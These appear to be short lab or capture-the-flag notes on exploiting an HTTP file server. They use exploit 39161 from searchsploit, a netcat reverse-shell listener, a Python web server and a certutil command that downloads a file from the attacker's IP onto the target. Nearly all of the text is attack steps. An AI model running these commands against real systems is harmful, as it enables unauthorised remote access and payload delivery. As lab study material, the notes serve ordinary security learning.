* `searchsploit httpd 2.3`
* `searchsploit -m 39161`
* Modify this exploit:
* `vim 39161.py`
* Change the "ip_addr" and the port number
* `:wq`
* In another terminal, start a netcat listener at any free port:
* `nc -nvlp 1234`
* In another terminal:
* Open the folder where the file you want to host is present.
* `python3 -m http.server 1234`
* In the first terminal where 39161.py is downloaded:
* `python 39161.py [Target IP] [Port number]` --> We might ahve to run this commmand multiple times
* This should give a shell session where netcat listener was running
* `certutil -urlcache -f http://[attacker'sIP]/[filename] [new file name]`
